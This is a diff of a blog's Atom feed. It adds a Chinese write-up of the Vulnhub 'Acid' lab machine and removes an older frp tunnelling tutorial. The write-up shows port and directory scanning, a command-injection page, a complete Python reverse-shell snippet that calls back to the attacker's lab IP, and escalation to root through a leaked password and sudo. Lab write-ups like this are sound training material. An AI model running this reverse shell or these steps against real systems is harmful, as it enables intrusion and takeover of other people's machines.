@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rj45mp.github.io/"/>
-  <updated>2019-11-24T06:12:55.216Z</updated>
+  <updated>2019-11-24T12:33:45.844Z</updated>
   <id>https://rj45mp.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>靶机渗透训练之Acid</title>
+    <link href="https://rj45mp.github.io/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/"/>
+    <id>https://rj45mp.github.io/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/</id>
+    <published>2019-11-24T10:31:57.049Z</published>
+    <updated>2019-11-24T12:33:45.844Z</updated>
+    
+    <content type="html"><![CDATA[<p>title: 靶机渗透训练之Acid<br>date: 2019-11-24 18:31:57</p><p>《Vulnhub靶场题解–红日安全团队》之Acid</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sX -A  192.168.154.145 -p0-65535</span><br></pre></td></tr></table></figure><p>开放33447端口，且为web服务</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124183638929.png" alt="image-20191124183638929"></p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124193924220.png" alt="image-20191124193924220"></p><p>dirbuster扫描目录，发现Challenge文件夹，内有敏感文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/dir-1.png" alt></p><p>在访问Challenge文件夹内的各种敏感文件的过程中，发现cake.php的源代码中存在线索</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124184401365.png" alt="image-20191124184401365"></p><p>此种手法（将目录写在标题上）类似前面的将Challenge文件夹写在标题，验证发现果真如此</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124184607559.png" alt="image-20191124184607559"></p><p>继续进行目录爆破,找到Magic_Box下的敏感文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt</span><br></pre></td></tr></table></figure><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124193152283.png" alt="image-20191124193152283"></p><p>在<code>http://192.168.154.145:33447/Challenge/Magic_Box/command.php</code>下发现命令注入漏洞。</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>在<code>http://192.168.154.145:33447/Challenge/Magic_Box/command.php</code>下</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124193731482.png" alt="image-20191124193731482"></p><p>构造命令注入payload</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124194155158.png" alt="image-20191124194155158"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>bash方式，nc方式都不成功，最后利用python反弹成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((&quot;192.168.154.131&quot;,6868))</span><br><span class="line">os.dup2(s.fileno(),0)</span><br><span class="line">os.dup2(s.fileno(),1)</span><br><span class="line">os.dup2(s.fileno(),2)</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])</span><br></pre></td></tr></table></figure><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124195552451.png" alt="image-20191124195552451"></p><h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>查看主机账户，发现除root外，还有两个后门账户</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124200150369.png" alt="image-20191124200150369"></p><p>查找和后门账户相关的文件,找到一份数据包，pwn_me文件夹内的文件作混淆思路的，根本没漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user saman 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124201523418.png" alt="image-20191124201523418"></p><p>利用python开启http服务，将流量包download下来，作流量分析，找到saman用户的密码<code>1337hax0r</code></p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124202440886.png" alt="image-20191124202440886"></p><p>利用找到的密码，登录saman账户</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124202801991.png" alt="image-20191124202801991"></p><p>继续提权，发现saman可以使用sudo权限</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124202923768.png" alt="image-20191124202923768"></p><p>直接sudo切换成root账户</p><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124203044222.png" alt="image-20191124203044222"></p><h2 id="提取flag"><a href="#提取flag" class="headerlink" title="提取flag"></a>提取flag</h2><p><img src="/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%AD%E7%BB%83%E4%B9%8BAcid/image-20191124203159279.png" alt="image-20191124203159279"></p><h2 id="回顾总结"><a href="#回顾总结" class="headerlink" title="回顾总结"></a>回顾总结</h2><p>论目录爆破的重要性，工具，多多强大的字典。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;title: 靶机渗透训练之Acid&lt;br&gt;date: 2019-11-24 18:31:57&lt;/p&gt;
+&lt;p&gt;《Vulnhub靶场题解–红日安全团队》之Acid&lt;/p&gt;
+&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; tit
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>利用php-ini构成的后门</title>
@@ -436,28 +460,6 @@
       
         &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在和E神的日常讨论中…&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/%E4%B8%80%E6%AC%A1%E5%AF%B9mysql%E6%BA%9
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>docker搭建frp实现内网穿透</title>
-    <link href="https://rj45mp.github.io/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
-    <id>https://rj45mp.github.io/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</id>
-    <published>2019-09-16T14:39:37.000Z</published>
-    <updated>2019-11-22T16:36:37.748Z</updated>
-    
-    <content type="html"><![CDATA[<p>一直以来都很羡慕PushEax的工作模式<br>【一台物理服务器+一个公网ip+一个域名】，做个内网穿透<br>然后随时随地远程桌面回去工作，不用像我这样每天背着几斤重的笔记本。<br>特别是今天中午，特别酸。<br>下午和傍晚上课的时候，特地搞了一下怎么玩frp的，这里记录一下。</p><h1 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h1><p>准备一个公网ip+一个域名，<br>我采用的是阿里云的学生机子+一个域名，<br>需要设置域名解析，具体可以参考阿里云里面的文档。</p><p>整体的架构如下：</p><p><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/8.png" alt></p><h1 id="下载frp"><a href="#下载frp" class="headerlink" title="下载frp"></a>下载frp</h1><p><a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">frp</a><br><a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">文档</a></p><p>1、服务端为Linux版</p><p>下载并解压：<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/1.png" alt></p><p>2、客户端为windows版<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/2.png" alt></p><h1 id="编辑frps-ini"><a href="#编辑frps-ini" class="headerlink" title="编辑frps.ini"></a>编辑frps.ini</h1><p>frps.ini中默认为7000端口，可以自行修改<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/3.png" alt></p><h1 id="编辑Dockerfile"><a href="#编辑Dockerfile" class="headerlink" title="编辑Dockerfile"></a>编辑Dockerfile</h1><p>创建编辑Dockerfile：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu</span><br><span class="line">COPY . /frp</span><br><span class="line">RUN chmod -R 777 /frp</span><br><span class="line">CMD [&quot;/frp/frps&quot;,&quot;-c&quot;,&quot;/frp/frps.ini&quot;]</span><br></pre></td></tr></table></figure><p>封装为镜像：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t frp .</span><br></pre></td></tr></table></figure><p><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/4.png" alt><br>注意：在使用64位的时候容器运行失败，后面修改为32位的frp了。</p><h1 id="创建和运行docker"><a href="#创建和运行docker" class="headerlink" title="创建和运行docker"></a>创建和运行docker</h1><p>查看、创建和运行frp的docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 9090:9090 -p 3389:3389 --name=Rj45_frp frp</span><br></pre></td></tr></table></figure><p>注意：<br>frp的docker中必须映射frps.ini设置的端口和一个目标端口<br>同时，云服务器的防火墙需要放行这两个端口。</p><h1 id="编辑frpc-ini"><a href="#编辑frpc-ini" class="headerlink" title="编辑frpc.ini"></a>编辑frpc.ini</h1><p>设置两个端口：<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/5.png" alt></p><h1 id="运行frpc-exe"><a href="#运行frpc-exe" class="headerlink" title="运行frpc.exe"></a>运行frpc.exe</h1><p>CMD中运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc.ini</span><br></pre></td></tr></table></figure><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>客户端创建账户并添加到远程桌面组：<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/6.png" alt></p><p>第三方pc测试：<br><img src="/docker%E6%90%AD%E5%BB%BAfrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/7.png" alt></p><p>接下来直接通过远程桌面+域名就可以愉快的工作了。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;一直以来都很羡慕PushEax的工作模式&lt;br&gt;【一台物理服务器+一个公网ip+一个域名】，做个内网穿透&lt;br&gt;然后随时随地远程桌面回去工作，不用像我这样每天背着几斤重的笔记本。&lt;br&gt;特别是今天中午，特别酸。&lt;br&gt;下午和傍晚上课的时候，特地搞了一下怎么玩frp的，这里记
       
     
     </summary>
